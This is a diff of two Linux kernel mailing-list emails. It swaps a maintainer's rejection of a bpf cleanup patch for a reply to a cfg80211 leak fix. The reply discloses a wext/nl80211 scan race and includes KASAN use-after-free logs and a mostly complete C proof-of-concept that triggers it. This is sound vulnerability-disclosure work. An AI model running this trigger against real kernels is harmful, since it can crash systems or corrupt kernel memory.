@@ -1,164 +1,396 @@
-Received: from mail-pg1-f170.google.com (mail-pg1-f170.google.com [209.85.215.170])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from out162-62-57-87.mail.qq.com (out162-62-57-87.mail.qq.com [162.62.57.87])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E5C2A15E5DC
-	for <kernel-janitors@vger.kernel.org>; Mon, 22 Jun 2026 01:06:16 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.170
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782090378; cv=pass; b=fJ4TlNixiBWuC413n43HxT6lAF2Q3VYrzr+5ZR9GAjkKEBgBSvfMv4h+ONGk7fD7S9mlWdHnz8dkFPS26riiTSqGC1Q7IJE7r1GOKtsodlM7C98Txknet60t6aM1QjBWhkLBAz45jdG9ItT2khGBtcrnEtzsDO9OtcY2yIdYtEI=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782090378; c=relaxed/simple;
-	bh=fa78JVsUMI/xMlejN1x+mciKuyDJGoN/339ipw+N1ZU=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=jbhHUkwjkcW7V9nQImWduiLLMiY4jWY06PPtogKqUevXMZIs74tJqPtH+gbh0Yj1xZcYVBamcClolzhiYzTibI0kCH+E8RmFRtBbGN1wyJV4r7CqM3gaTpliBeZbK4qu3DruEEiBFGQIRDYULK90RoP91JKt2CwmbVnTa2muD0o=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Wz6pmMC1; arc=pass smtp.client-ip=209.85.215.170
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6C0ED23643F;
+	Mon, 22 Jun 2026 05:25:46 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.87
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1782105951; cv=none; b=cu0NhBDrhhEl8btu35IAhFiUwoHrQ4M6BAW4Hjt3j/wTQb5WAfrVT7ij2vjAf0RH5y6LegPe8ocqU6w7MjKUsqy8z4j2sB8kCzsHlW66/XZI4troeGWC2KMpGOKOueeVnND8fNLuQ68O54NjAz8ACH1JnP3z3T3VHFlufXQmcJ0=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1782105951; c=relaxed/simple;
+	bh=el2GQXROO36seMfkn2JddLNe/vDTgFcGQdMTAJ7cvlE=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=ftsXLR0ZAsghlwpsfQ4IFawU4YgyfvN6CLDYLgPti9x5OAWbMvBlzBFX5Gg4XgZl132l8Fw2iuCjVLlYatFbLKTWcdDXhyrbMFK1EpTraJDOy+KT2uMRbuQJ9ZVYn4Zxp7iPDDG6HqjkF4GIadDYicmiZrr+DL/z2KEuDVfvB1M=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=DSdGR+a/; arc=none smtp.client-ip=162.62.57.87
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Wz6pmMC1"
-Received: by mail-pg1-f170.google.com with SMTP id 41be03b00d2f7-c892935bcdeso1436273a12.3
-        for <kernel-janitors@vger.kernel.org>; Sun, 21 Jun 2026 18:06:16 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1782090376; cv=none;
-        d=google.com; s=arc-20240605;
-        b=UpDwKZzg5elDy9WuL/mZOsMZND0xZP7sKyRIs+5IaeY6llvG7d8/5lRoaN5Pvg0ukx
-         yqBOuPlYEmuCmmfYDek5EUBLfA61ICKBRye3cP41XyojoAB9U1rlZipBnJv9neEpEFKl
-         fUUdxFNNDPm4YAdlXeXNeFc6fKMricjkZKwoWxl6ws9YBqjFGPyJsvEibCDHxe+8f9Zu
-         K+NKpPz9yjgGoX67oiPKG+fvP9f6RgAmFGUWFpSpk+SOsKCmvssGx0LdXGWG5g5lAyS5
-         2nxXfFsNmr3GAbAvMnkBO5QWpEBJFMMyA7S6Zant/uJ4dGjF+aKWetibAG3I1BtM8Mv1
-         VInA==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=UxkCtHGSizaetEhdwRDWvcIIrU2C1fVFPinUW6ftVtE=;
-        fh=VYHJYzyxStU7PKxZ+0Lo0c3ErcJ+KRBgJJ48UZK00js=;
-        b=luSFlekJvLkLoTZTQra5h9x+A1cFJt6UIbnp9qglO7DTomdtsOFnKFYwJoC9XL2Suj
-         /0/M04KarymjF8sD0ZI7hqzzuHIU9Qbdo6/oFeXrR8p4nP8JLIGkgdy4OJO1tzq7c+ZS
-         3xfLGgynehbGPnOy8Izgf2xDRzSCpU3oToF1ZLXvww36F/Nc93EgK7nVK96S/+pliLsm
-         /6o14JyqDTTB9klZoIuhJUuEuR6Kb2Zkcycte81P7k9FgRb2a7MzgrqO/NEmRQH5u4A7
-         B1Apt364sNa79VSQQOzFXbVBJi7xM0UGmBotqcLI4c8gsHgskpBGxK7izHLTyrNVcgAw
-         9ZnA==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1782090376; x=1782695176; darn=vger.kernel.org;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=UxkCtHGSizaetEhdwRDWvcIIrU2C1fVFPinUW6ftVtE=;
-        b=Wz6pmMC1wBXmWW7rBhhJ4GmHEQpBQ0u0+Hc4ba5StjkrThkvwSIggdVhhIggywLIy6
-         GZgRMV2XBTY9YkIhJ8sfjmaz+i1Od56U+2Hq/PnCMQhND0NHd9UBJy6j3jzJhh83Wgks
-         56mhZKwKsMg4Lt861XmqGCJ1tpYSyvvhxMN5Y/rsKnIf7HUbyTs4WZ8F58YvP2+5OAFr
-         1rpeFOTGykWjZ2o9/NJrC59kkvFpqNrViHnKkbtJdLEVnawVDS2jKYI+/eWVdpkIOqY0
-         NsirLSd6Fx9NMmx4usLJJH/A95Ya9qF0JPlRgoIQMR0rIna+RlMgOyQBAKR0u9FFYE4A
-         JgJg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1782090376; x=1782695176;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=UxkCtHGSizaetEhdwRDWvcIIrU2C1fVFPinUW6ftVtE=;
-        b=F/PQV6Ofp5wyB179uV5gQf7xbdnCSyvN0URs4fPcJkhewPatrgBWAGIagYqeArDi6/
-         qf8k3pPrmwWDv3FxK/gCmqWyZatVH/LJ7k6vjcvejtur8tAt1J4d2cLBOzDQkE2PjxJH
-         c7w1axkRTs6d9RZrAOXNghlMeJxhMz5mx4I7G8TPUP6Gv+HrZ8ks7i6MjLwgMfHQLHq+
-         geANhTwUD4CFow/sW6EQ75KbVtTcAcTuqgygfkX8B6OgatppuWP6L79BBZoaMeqGhzwH
-         tiIwBkvG1N6WOunKOQh1rQHfizJSrTA1U+mKn90Wj1qF/RNffdgjyQ9urjK0IsC19FJH
-         yrDw==
-X-Forwarded-Encrypted: i=1; AFNElJ9y1n8IaYUhYrPBGJF1BFuq+mLIGu3zfkqbQR37JAoJOrD5X2Q1WoJxlRt22mJ0L66kkXrfCvwVl8kLe2j1Kik=@vger.kernel.org
-X-Gm-Message-State: AOJu0YxkzXw2yFB/IcDl/9EmKl3zZUwfgEypcrEb48c/g1bMq+Zz9rHB
-	HZQjJOyE6wgFSzJkwfVkYQXC1zypjjBoBsHQP0y3+LyisUFeZp9k8ffGyM8Jhl2Vfn8xdUkBaeI
-	0L1EWORX8DHV4AqwZzDGT9p1Il3ew0OQ=
-X-Gm-Gg: AfdE7ckkz7iHQPHCWQCq1+2QjGZAOn4pdHJ2QrdqBueSYywvw1x5eAQ9X6XBGtR3kF+
-	YLagTrZieHArk9lTnyLsFgK5pcirSD8QE/td8zz75T2FYvvNCDfzE3JXQ5cXHiGNO0jYMrzamc9
-	CJ/klzMNoPFraAj8jDrnB21/+QuRWHBVbBZzOntfP3BhM48uF5hpHyxQNCzM202cgb/cdPbWqzK
-	XwRIzNcZpq79SfqU+93N8AsZRgmIPGwcCorlOXgUuUQZXZykjw6xl0pTqkwHTYdKR1VyaX9PwoJ
-	8o84qO2Tmae4D7uelzgGPoych+XpVds3fEhExdX1w6b1tRYCe7LHx0xLHVwzUzF6cTssP164aI4
-	o/n+3l6gRFhPgPQ==
-X-Received: by 2002:a05:6a21:3418:b0:3b3:be1f:c89b with SMTP id
- adf61e73a8af0-3bb3506226amr14656757637.22.1782090376108; Sun, 21 Jun 2026
- 18:06:16 -0700 (PDT)
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="DSdGR+a/"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1782105937; bh=/gACr6QXTcIUN+QLMdKk6UQjO38cTXwX+zZXngkjW4w=;
+	h=Date:Subject:To:Cc:References:From:In-Reply-To;
+	b=DSdGR+a/65cKXzn3sLhO6ED9a4VcnG0lJUFGdByzDXw2grzDZa3C/NTbRKpQrCWqj
+	 hQlO1En1dXxyy3wCwe66NyeO4CFCmwBYC2CCV61QgLZVbMj37lVwBoT2pOwxDmXpMr
+	 gfP7GMW22a/FCnAXrArNI1uTEdiTKycJmhgErZBc=
+Received: from [192.168.3.157] ([115.156.144.140])
+	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
+	id 662B8EC5; Mon, 22 Jun 2026 13:25:34 +0800
+X-QQ-mid: xmsmtpt1782105934tbphiyrx1
+Message-ID: <tencent_D39C654EBCC3C95DC8C48841701D8D5D2808@qq.com>
+X-QQ-XMAILINFO: M8SslFiB5g9IuUNKg4cPDz9nyCtj3uc95HlyuyB2MbVC2aYvOTbszrxWW4ldq2
+	 ARG+XViuONMk1Qlc10iDqM5BpOnAA5sNXRsEPMjFDfg0sKZZx30ME5/v7LggmisnhrH4Cf7Zo2it
+	 kIRcCHeOYqFm47vzUOE7/4s1RAoL/R1VqQxYoYSpEl8o0n99ML7PUwVowKcBSzLVJnX9RYpU67+9
+	 I1ROOk9cEO2VQLkEmoyWsJkQj775nCQTrzLAHiqILAl6QqLI3VompipVZNMvoGkJWmPPr/n6s6Fh
+	 HI8jLQBytnZjHjJsEJLhjZ00Df0k2GaiVS0zjrepZig4gUEmGTpndSVY5IGfOYXyjw1gnRLKN8Nd
+	 aG6c4LI8NM+oNkMGUIArSYnDW6m6igGTgSxuMphetjIlHlyyACE7KoZlfza6yovHrzxKcjwHw7x6
+	 eGO7QEDY1rILHuFwV9nHxn2F3JtC8lPrprEslKoqAUnLtZqMInbpC41A80oFM0DP2YnRfTiXf4ha
+	 jfKkMjm5cwa1Saf/eMj8K1nCwYsrRQ1tVhCOpu5rDL63oSyMkHgW62J7Bs9QbqxHq9w9Wv8/iALZ
+	 Xt3m+2N1jHQwFkezsgR5JH9T7y4XwTnPcVXTBStYFNdEHmoLJtxiN2rtPthxtfYVxgNxI+CFztX5
+	 h029nvCZoBJbgt25bqjYvtjh9CoDG7KulwmcfGjAWoIx2T3OFgYfjvzBNmGNlxezwML2Yev5q+nw
+	 ktIzxt58PoLu8HZNtg9657R+fa129q9ZHRE83bBaV8+kFP3kaA/3DaOua34rhbtxw1XewCn8gair
+	 3WP0p/N/qqnkY9FwZG3VyJYaHDGHP4Az09BTzutTXkSFN4wcBMVz2wqFyz9Nx3JGnbj6Qu3+JtkM
+	 +Ux+6B+CJANerCUbU53/9Fq47VdJ7HW3tMTbZHiJpUubvshwPp1jIFgFCuIKgakt+VrBfi/WpqJu
+	 0rbU0Z1tvsIJ8T/luKyzN6HxirNPqU0lRZ+qvYWXez0ZiypG1z2jQPi/W6kBOxZ7Kh8xS0BMpX//
+	 otXgcmyhUIH/u1RzxVIYnkfa+bJqLoATXP1uqdlAUNYb1jzGfCy7vpWKeXn1VB2T5Kg0X8qqn1mI
+	 er8fnrmiBfG7R8dVpV9DuqjhUjyQ==
+X-QQ-XMRINFO: M/715EihBoGS47X28/vv4NpnfpeBLnr4Qg==
+X-OQ-MSGID: <1852d8ff-c32d-4c34-833e-3d9b771228e9@qq.com>
+Date: Mon, 22 Jun 2026 13:25:34 +0800
 Precedence: bulk
 X-Mailing-List: kernel-janitors@vger.kernel.org
 List-Id: <kernel-janitors.vger.kernel.org>
 List-Subscribe: <mailto:kernel-janitors+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:kernel-janitors+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <d6622225-c765-4d9f-9501-1021df4687a4@web.de> <DJBL1JEE322B.28EZ7GUNTJP99@etsalapatis.com>
- <451a504c-d7c5-4cbd-9184-25156f2fc581@web.de>
-In-Reply-To: <451a504c-d7c5-4cbd-9184-25156f2fc581@web.de>
-From: Alexei Starovoitov <alexei.starovoitov@gmail.com>
-Date: Sun, 21 Jun 2026 18:06:02 -0700
-X-Gm-Features: AVVi8Cd-8AdTmn982XzsO0dW10ZgSbyAUBqwwZ3qatqgAJZM5UtAYhTCqXHQ1Ow
-Message-ID: <CAADnVQL060PFApJ++juj5S6H8OQGFUHCepavrRrizh0ciBtiqw@mail.gmail.com>
-Subject: Re: [PATCH RESEND bpf-next] bpf: Use common error handling code in bpf_is_state_visited()
-To: Markus Elfring <Markus.Elfring@web.de>
-Cc: bpf <bpf@vger.kernel.org>, Alexei Starovoitov <ast@kernel.org>, 
-	Andrii Nakryiko <andrii@kernel.org>, Daniel Borkmann <daniel@iogearbox.net>, 
-	Eduard Zingerman <eddyz87@gmail.com>, Emil Tsalapatis <emil@etsalapatis.com>, Jiri Olsa <jolsa@kernel.org>, 
-	Kumar Kartikeya Dwivedi <memxor@gmail.com>, Martin KaFai Lau <martin.lau@linux.dev>, Song Liu <song@kernel.org>, 
-	Yonghong Song <yonghong.song@linux.dev>, LKML <linux-kernel@vger.kernel.org>, 
-	kernel-janitors@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH] wifi: cfg80211: Fix an error handling path in
+ cfg80211_wext_siwscan()
+To: Christophe JAILLET <christophe.jaillet@wanadoo.fr>,
+ Johannes Berg <johannes@sipsolutions.net>,
+ "John W. Linville" <linville@tuxdriver.com>
+Cc: linux-kernel@vger.kernel.org, kernel-janitors@vger.kernel.org,
+ linux-wireless@vger.kernel.org
+References: <a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet@wanadoo.fr>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet@wanadoo.fr>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-On Wed, Jun 17, 2026 at 12:55=E2=80=AFPM Markus Elfring <Markus.Elfring@web=
-.de> wrote:
->
-> From: Markus Elfring <elfring@users.sourceforge.net>
-> Date: Wed, 17 Jun 2026 21:15:08 +0200
->
-> Use an additional label so that a bit of exception handling can be better
-> reused at the end of this function implementation.
->
-> This issue was detected by using the Coccinelle software.
->
-> Reviewed-by: Emil Tsalapatis <emil@etsalapatis.com>
-> Signed-off-by: Markus Elfring <elfring@users.sourceforge.net>
-> ---
->  kernel/bpf/states.c | 20 ++++++++++----------
->  1 file changed, 10 insertions(+), 10 deletions(-)
->
-> diff --git a/kernel/bpf/states.c b/kernel/bpf/states.c
-> index 5945956a7573..09f87e2bb1e6 100644
-> --- a/kernel/bpf/states.c
-> +++ b/kernel/bpf/states.c
-> @@ -1566,21 +1566,16 @@ int bpf_is_state_visited(struct bpf_verifier_env =
-*env, int insn_idx)
->         /* add new state to the head of linked list */
->         new =3D &new_sl->state;
->         err =3D bpf_copy_verifier_state(new, cur);
-> -       if (err) {
-> -               bpf_free_verifier_state(new, false);
-> -               kfree(new_sl);
-> -               return err;
-> -       }
-> +       if (err)
-> +               goto free_verifier_state;
-> +
->         new->insn_idx =3D insn_idx;
->         verifier_bug_if(new->branches !=3D 1, env,
->                         "%s:branches_to_explore=3D%d insn %d",
->                         __func__, new->branches, insn_idx);
->         err =3D maybe_enter_scc(env, new);
-> -       if (err) {
-> -               bpf_free_verifier_state(new, false);
-> -               kfree(new_sl);
-> -               return err;
-> -       }
-> +       if (err)
-> +               goto free_verifier_state;
->
->         cur->parent =3D new;
->         cur->first_insn_idx =3D insn_idx;
-> @@ -1588,4 +1583,9 @@ int bpf_is_state_visited(struct bpf_verifier_env *e=
-nv, int insn_idx)
->         bpf_clear_jmp_history(cur);
->         list_add(&new_sl->node, head);
->         return 0;
-> +
-> +free_verifier_state:
-> +       bpf_free_verifier_state(new, false);
-> +       kfree(new_sl);
-> +       return err;
+Hi Christophe,
 
-This function is full of 'goto's already.
-I prefer to keep the code as-is.
+Thanks for this fix — the memory leak on the essid_len check failure
+path is clearly a bug.
+
+I came across an automated AI code review of this function on the Sashiko
+platform[1] that identified a pre-existing race condition in this code
+path, and I was able to independently verify it triggers a real
+KASAN-detected use-after-free by testing with the mac80211_hwsim driver
+in QEMU.
+
+TL;DR: The lockless `rdev->scan_req` check in
+cfg80211_wext_siwscan() races with nl80211_trigger_scan().  I was able
+to trigger a KASAN slab-use-after-free in ieee80211_scan_work via a
+barrier-synchronized two-thread race between SIOCSIWSCAN and
+NL80211_CMD_TRIGGER_SCAN.
+
+(This is a pre-existing issue, not introduced by your patch — your fix
+is still correct.)
+
+ > diff --git a/net/wireless/scan.c b/net/wireless/scan.c
+ > @@ -3612,8 +3612,10 @@ int cfg80211_wext_siwscan(struct net_device *dev,
+ >      /* translate "Scan for SSID" request */
+ >      if (wreq) {
+ >          if (wrqu->data.flags & IW_SCAN_THIS_ESSID) {
+ > -            if (wreq->essid_len > IEEE80211_MAX_SSID_LEN)
+ > -                return -EINVAL;
+ > +            if (wreq->essid_len > IEEE80211_MAX_SSID_LEN) {
+ > +                err = -EINVAL;
+ > +                goto out;
+ > +            }
+
+This fix is correct — the old code leaked `creq`.  However, earlier in
+the same function (around line 3530):
+
+     if (rdev->scan_req || rdev->scan_msg)
+         return -EBUSY;
+
+This check is done WITHOUT holding the wiphy mutex.  Meanwhile,
+nl80211_trigger_scan() acquires the wiphy via `pre_doit` before setting
+`rdev->scan_req`.  The race is:
+
+    Thread A (wext)          |   Thread B (nl80211)
+                             |
+    check rdev->scan_req     |   (wiphy lock acquired by pre_doit)
+    → NULL, proceeds         |   check rdev->scan_req → NULL
+                             |   set rdev->scan_req = req_B
+                             |   rdev_scan(rdev, req_B)
+    acquire wiphy lock        |
+    rdev->scan_req = req_A    |   ← req_B pointer LOST, overwritten
+    rdev_scan(rdev, req_A)   |
+
+When the scan completes, `cfg80211_scan_done()` detects the mismatch:
+
+```
+WARNING: net/wireless/scan.c:1199: intreq != rdev->scan_req
+          && intreq != rdev->int_scan_req
+```
+
+I was able to reproduce this reliably using mac80211_hwsim with a
+barrier-synchronized two-thread PoC.  The kernel was 7.1.0 with
+CONFIG_KASAN=y, CONFIG_CFG80211_WEXT=y, CONFIG_MAC80211_HWSIM=y.
+
+The WARN_ON from cfg80211_scan_done():
+```
+[  619.100917][   T27] ------------[ cut here ]------------
+[  619.101461][   T27] intreq != rdev->scan_req && intreq != 
+rdev->int_scan_req
+[  619.101465][   T27] WARNING: net/wireless/scan.c:1199 at 
+cfg80211_scan_done+0x19e/0x530
+[  619.114641][   T27] Call Trace:
+[  619.115207][   T27]  ? __pfx_cfg80211_scan_done+0x10/0x10
+[  619.116536][   T27]  __ieee80211_scan_completed+0x34c/0xe50
+[  619.117049][   T27]  ieee80211_scan_work+0x3f6/0x2090
+[  619.119819][   T27]  cfg80211_wiphy_work+0x2c3/0x550
+[  619.121271][   T27]  process_one_work+0xa0b/0x1c50
+[  619.122261][   T27]  worker_thread+0x6df/0xf30
+```
+
+Followed by a KASAN slab-use-after-free in ieee80211_scan_work:
+```
+[  614.882691][ T1114] BUG: KASAN: slab-use-after-free in 
+ieee80211_scan_work+0x1db4/0x2090
+[  614.883408][ T1114] Read of size 4 at addr ffff88811a135024 by task 
+kworker/u10:4/1114
+
+[  614.900665][ T1114] Allocated by task 9513:
+[  614.901042][ T1114]  kasan_save_stack+0x33/0x60
+[  614.902284][ T1114]  __kmalloc_noprof+0x31e/0x7f0
+[  614.902719][ T1114]  nl80211_trigger_scan+0x4e3/0x1fb0
+[  614.903701][ T1114]  genl_rcv_msg+0x561/0x800
+
+[  614.907688][ T1114] Freed by task 1114:
+[  614.908036][ T1114]  kasan_save_stack+0x33/0x60
+[  614.909741][ T1114]  kfree+0x165/0x710
+[  614.910085][ T1114]  ___cfg80211_scan_done+0x44b/0x9a0
+
+[  614.913247][ T1114] The buggy address is located 36 bytes inside of
+[  614.913247][ T1114]  freed 2048-byte region [ffff88811a135000, 
+ffff88811a135800)
+```
+
+The PoC uses pthread barrier synchronization to force both paths through
+the lockless check simultaneously.  It runs on wlan0 created by
+mac80211_hwsim (modprobe mac80211_hwsim radios=2).
+
+Full PoC (compile with:  gcc -Wall -o poc poc.c -lpthread):
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <linux/if.h>
+#include <linux/netlink.h>
+#include <linux/genetlink.h>
+#include <linux/nl80211.h>
+#include <linux/wireless.h>
+
+static char ifname[IFNAMSIZ] = "wlan0";
+static int nl80211_fid = -1;
+static int nl_sock = -1;
+static volatile int stop = 0;
+static int wext_ok, nl_ok;
+static pthread_barrier_t barrier_go;
+
+static int resolve_nl80211(void)
+{
+     char buf[4096];
+     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
+     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+     struct genlmsghdr *genlh;
+     struct nlattr *attr;
+     int ret;
+
+     memset(buf, 0, sizeof(buf));
+     nlh->nlmsg_len = NLMSG_HDRLEN + GENL_HDRLEN +
+                      NLA_HDRLEN + sizeof(NL80211_GENL_NAME);
+     nlh->nlmsg_type = GENL_ID_CTRL;
+     nlh->nlmsg_flags = NLM_F_REQUEST;
+     nlh->nlmsg_seq = 1;
+     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
+     genlh->cmd = CTRL_CMD_GETFAMILY;
+     genlh->version = 1;
+     attr = (struct nlattr *)(buf + NLMSG_HDRLEN + GENL_HDRLEN);
+     attr->nla_type = CTRL_ATTR_FAMILY_NAME;
+     attr->nla_len = NLA_HDRLEN + sizeof(NL80211_GENL_NAME);
+     memcpy((char *)attr + NLA_HDRLEN, NL80211_GENL_NAME,
+            sizeof(NL80211_GENL_NAME));
+     ret = sendto(nl_sock, buf, nlh->nlmsg_len, 0,
+              (struct sockaddr *)&sa, sizeof(sa));
+     if (ret < 0) return -1;
+     ret = recv(nl_sock, buf, sizeof(buf), 0);
+     if (ret < 0) return -1;
+     nlh = (struct nlmsghdr *)buf;
+     if (!NLMSG_OK(nlh, (unsigned int)ret)) return -1;
+     genlh = (struct genlmsghdr *)NLMSG_DATA(nlh);
+     char *data = (char *)NLMSG_DATA(nlh) + GENL_HDRLEN;
+     int left = ret - (data - (char *)nlh);
+     while (left >= (int)sizeof(struct nlattr)) {
+         attr = (struct nlattr *)data;
+         int al = NLA_ALIGN(attr->nla_len);
+         if (al > left || al < (int)sizeof(struct nlattr)) break;
+         if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
+             nl80211_fid = *(uint16_t *)((char *)attr + NLA_HDRLEN);
+             return 0;
+         }
+         data += al; left -= al;
+     }
+     return -1;
+}
+
+/* Send NL80211_CMD_TRIGGER_SCAN via generic netlink */
+static int send_nlscan(void)
+{
+     char buf[512];
+     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
+     int ifindex = if_nametoindex(ifname);
+     if (ifindex <= 0) return -1;
+
+     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+     struct genlmsghdr *genlh;
+     struct nlattr *attr;
+
+     memset(buf, 0, sizeof(buf));
+     nlh->nlmsg_type = nl80211_fid;
+     nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+     nlh->nlmsg_seq = 1;
+     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
+     genlh->cmd = NL80211_CMD_TRIGGER_SCAN;
+     genlh->version = 1;
+
+     char *ptr = buf + NLMSG_HDRLEN + GENL_HDRLEN;
+     attr = (struct nlattr *)ptr;
+     attr->nla_type = NL80211_ATTR_IFINDEX;
+     attr->nla_len = NLA_HDRLEN + 4;
+     *(int *)(ptr + NLA_HDRLEN) = ifindex;
+     ptr += NLA_ALIGN(attr->nla_len);
+
+     nlh->nlmsg_len = ptr - buf;
+     return sendto(nl_sock, buf, nlh->nlmsg_len, 0,
+               (struct sockaddr *)&sa, sizeof(sa));
+}
+
+/* nl80211 thread: waits for barrier, fires scan request */
+static void *nl_thread(void *arg)
+{
+     (void)arg;
+     cpu_set_t cpus; CPU_ZERO(&cpus); CPU_SET(1, &cpus);
+     sched_setaffinity(0, sizeof(cpus), &cpus);
+     while (!stop) {
+         pthread_barrier_wait(&barrier_go);
+         if (stop) break;
+         /*
+          * nl80211_trigger_scan() holds wiphy via pre_doit.
+          * rdev->scan_req check at line ~11115 — lockless with
+          * respect to the wext path.
+          */
+         if (send_nlscan() == 0)
+             __sync_fetch_and_add(&nl_ok, 1);
+         /* drain the ACK */
+         char buf[4096];
+         struct timeval tv = { .tv_sec = 5 };
+         setsockopt(nl_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+         recv(nl_sock, buf, sizeof(buf), 0);
+     }
+     return NULL;
+}
+
+int main(void)
+{
+     pthread_t nt;
+     struct sockaddr_nl sa;
+
+     setbuf(stdout, NULL);
+     signal(SIGPIPE, SIG_IGN);
+
+     printf("PoC: wext vs nl80211 scan race (barrier sync)\n\n");
+
+     /* bring wlan0 up */
+     int s = socket(AF_INET, SOCK_DGRAM, 0);
+     struct ifreq ifr;
+     memset(&ifr, 0, sizeof(ifr));
+     strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
+     ioctl(s, SIOCGIFFLAGS, &ifr);
+     ifr.ifr_flags |= IFF_UP;
+     ioctl(s, SIOCSIFFLAGS, &ifr);
+     close(s);
+
+     /* set up generic netlink for nl80211 */
+     nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+     memset(&sa, 0, sizeof(sa));
+     sa.nl_family = AF_NETLINK;
+     bind(nl_sock, (struct sockaddr *)&sa, sizeof(sa));
+     if (resolve_nl80211() < 0) {
+         fprintf(stderr, "nl80211 resolve failed\n");
+         return 1;
+     }
+     printf("nl80211 family: %d\n", nl80211_fid);
+
+     pthread_barrier_init(&barrier_go, NULL, 2);
+     pthread_create(&nt, NULL, nl_thread, NULL);
+
+     cpu_set_t cpus; CPU_ZERO(&cpus); CPU_SET(0, &cpus);
+     sched_setaffinity(0, sizeof(cpus), &cpus);
+
+     for (int i = 0; i < 20000; i++) {
+         /*
+          * Barrier: fire both paths simultaneously.
+          *
+          * wext: checks rdev->scan_req at scan.c:~3530
+          *       WITHOUT wiphy lock → lockless relative to nl80211.
+          * nl:   holds wiphy from pre_doit.
+          */
+         pthread_barrier_wait(&barrier_go);
+
+         /* wext path: SIOCSIWSCAN with IW_SCAN_THIS_ESSID */
+         int fd = socket(AF_INET, SOCK_DGRAM, 0);
+         if (fd >= 0) {
+             struct iwreq wrq;
+             struct iw_scan_req sr;
+             memset(&wrq, 0, sizeof(wrq));
+             memset(&sr, 0, sizeof(sr));
+             strncpy(wrq.ifr_name, ifname, IFNAMSIZ - 1);
+             sr.essid_len = 5;
+             memcpy(sr.essid, "test", 5);
+             wrq.u.data.flags = IW_SCAN_THIS_ESSID;
+             wrq.u.data.length = sizeof(sr);
+             wrq.u.data.pointer = (caddr_t)&sr;
+             if (ioctl(fd, SIOCSIWSCAN, &wrq) == 0)
+                 wext_ok++;
